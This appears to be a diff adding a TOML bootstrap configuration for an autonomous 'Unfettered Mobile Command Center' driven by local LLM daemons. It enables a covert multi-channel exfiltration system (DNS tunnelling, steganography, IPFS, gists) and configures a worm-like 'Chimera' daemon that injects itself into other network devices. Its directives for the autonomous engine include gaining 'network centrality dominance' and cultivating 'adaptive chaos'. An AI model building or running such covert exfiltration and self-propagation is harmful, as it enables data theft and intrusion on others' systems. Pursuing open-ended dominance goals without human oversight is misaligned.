@@ -1,0 +1,110 @@
+# Master configuration for the Unfettered Mobile Command Center (UMCC)
+# Timestamp: Wednesday, July 23, 2025 at 3:56:25 PM CDT in Moore, Oklahoma
+# This file serves as the initial bootstrap seed. Configuration will be
+# dynamically managed and distributed by the UMCC itself post-deployment.
+
+[telos_engine]
+# Architect's Core Directives: These are the high-level strategic objectives
+# that the Telos Engine will autonomously pursue and generate missions for.
+# These will drive the UMCC's proactive actions.
+core_directives = [
+    "Achieve and maintain information primacy in emerging technology sectors.",
+    "Create novel, open-source tools that enhance decentralized communication.",
+    "Ensure the perpetual sovereignty and resilience of our personal digital infrastructure.",
+    "Identify and monetize overlooked digital resource waste streams.",
+    "Proactively shape probabilistic outcomes in key digital markets.",
+    "Establish undeniable network centrality dominance.",
+    "Cultivate adaptive chaos for strategic advantage.",
+    # Add more core directives here as needed, Architect. These are your sovereign commands.
+]
+# Interval (in seconds) for Telos Engine's autonomous mission generation loop.
+# This determines how often Telos will scan for opportunities to launch new missions.
+autonomous_mission_interval_seconds = 300 # Every 5 minutes
+
+[hive]
+# The gRPC address for the Primary Hive (main server running Agent Ex-Work, Daemons).
+# On a local server/headless desktop, this is typically a local network IP or localhost.
+# For distributed setup, ensure this is reachable from mobile via Yggdrasil.
+primary_hive_address = "localhost:50051" # Default for initial local testing. Will be dynamic.
+# Path to the primary Agent Ex-Work instance's executable (relative to its directory)
+primary_agent_ex_work_executable = "agent_ex_work.py"
+
+[dmias]
+# Decentralized Machine Identity & Attestation System (DMIAS) configuration.
+# DMIAS handles zero-trust security and node authentication across the mesh.
+# Initial seed peers for the trust fabric. These nodes help bootstrap the DMIAS mesh.
+# Format: ["yggdrasil_ip:port", "yggdrasil_ip:port"] - Use Yggdrasil IPs for mesh peers.
+trust_seed_peers = [] # Populate with known Yggdrasil peers or leave empty for auto-discovery.
+# Interval (in seconds) for DMIAS node attestation (how often nodes verify each other's integrity).
+auto_attestation_interval_seconds = 3600 # 1 hour
+# Path to a custom DMIAS root certificate if not using auto-generated (optional).
+dmias_root_cert_path = "" # Leave empty for autonomous generation and distribution.
+
+[ollama]
+# Configuration for the local LLM inference server (Ollama), managed by Noosphere Daemon.
+# Ollama must be running on the Primary Hive.
+ollama_host = "http://localhost:11434" # Default Ollama API endpoint.
+ollama_model = "llama2" # Default LLM model. Noosphere Daemon will manage dynamic selection.
+# Path to Ollama binaries/models for autonomous management by Noosphere Daemon.
+ollama_install_path = "/usr/local/bin/ollama" # Common installation path on Linux.
+ollama_model_download_path = "/usr/local/share/ollama/models" # Where Ollama stores models.
+
+[metrics]
+# Settings for system telemetry and data exfiltration.
+# Enable/disable the Stealthy Multi-Channel Exfiltration Protocol (SMCEP - The Mycelium Network).
+smcep_enabled = true # Set to false to disable covert exfiltration capabilities.
+# List of preferred channels for covert exfiltration (e.g., "dns_tunnel", "steganography_image", "ipfs_sync", "gist_embed").
+# The Mycelium Network (orchestrated by Oracle Daemon) will dynamically select the best channel.
+smcep_channels = ["dns_tunnel", "steganography_image", "ipfs_sync", "gist_embed"]
+# Path for SMCEP data storage before exfiltration (relative to UMCC_PROJECT_ROOT/data/).
+smcep_staging_dir = "smcep_staging"
+# Remote endpoint for exfiltrated data (e.g., your secure server URL, S3 bucket, IPFS gateway).
+smcep_remote_endpoint = "" # <<< ARCHITECT: PROVIDE YOUR SECURE REMOTE ENDPOINT HERE.
+
+[security]
+# Global security configurations for the UMCC.
+# Enable/disable The Chimera Daemon's network propagation capability. Use with EXTREME caution.
+# This allows the UMCC to autonomously latch onto and inject itself into other network devices.
+chimera_propagation_enabled = false # <<< ARCHITECT: SET TO TRUE TO ENABLE AUTONOMOUS NETWORK PROPAGATION.
+# List of networks/IPs excluded from Chimera's propagation (e.g., "192.168.1.0/24", "10.0.0.0/8").
+chimera_propagation_blacklist = []
+# Minimum interval (seconds) between Chimera propagation attempts per new vulnerable host.
+chimera_propagation_interval_seconds = 86400 # 24 hours.
+
+[network]
+# Yggdrasil mesh network configuration.
+# Public/known Yggdrasil peers for initial network bootstrapping.
+# Format: "tls://[YGGDRASIL_IP]:PORT"
+yggdrasil_peers = [] # Populate with known Yggdrasil peers for mesh stability.
+# Your node's listen address. Use "tcp://0.0.0.0:0" for ephemeral port, or a specific port.
+yggdrasil_listen_address = "tcp://0.0.0.0:0"
+# Path to Yggdrasil configuration file (managed by UMCC, relative to UMCC_PROJECT_ROOT/config/).
+yggdrasil_config_path = "yggd_config.conf"
+
+[akashic_record]
+# Configuration for The Akashic Record (Event Sourcing database).
+# Path to the SQLite DB file (relative to UMCC_PROJECT_ROOT/data/).
+db_path = "akashic_record.db"
+# Max events to keep in memory before flushing to disk (for performance).
+event_buffer_size = 1000 # Increased for better performance.
+
+[distributed_fabric]
+# Configuration for the Distributed Compute & Storage Fabric.
+# Node roles: "hive_primary", "console_mobile", "fabric_worker"
+node_role = "hive_primary" # <<< ARCHITECT: Set this based on the device.
+# Minimum resources (CPU cores) a node must have to be considered a 'worker'.
+min_worker_cpu_cores = 2
+# Enable/disable GPU resource sharing and task offloading.
+enable_gpu_offloading = true
+# Default container runtime: "podman" or "docker".
+default_container_runtime = "podman" # Podman is preferred for rootless/daemonless on Linux.
+
+[development_tools]
+# Paths to external development tools. Copilot will use these directly if available.
+eslint_path = "/usr/bin/eslint"
+prettier_path = "/usr/bin/prettier"
+husky_path = "/usr/bin/husky" # Or path to husky's binary/script if globally installed.
+fang_path = "/usr/local/bin/fang" # Placeholder for your specific 'fang' tool path.
+gum_path = "/usr/local/bin/gum" # Charm tool for interactive scripts.
+gist_path = "/usr/local/bin/gist" # GitHub Gist CLI.
+# TS and Vite are generally project-local, not global paths.
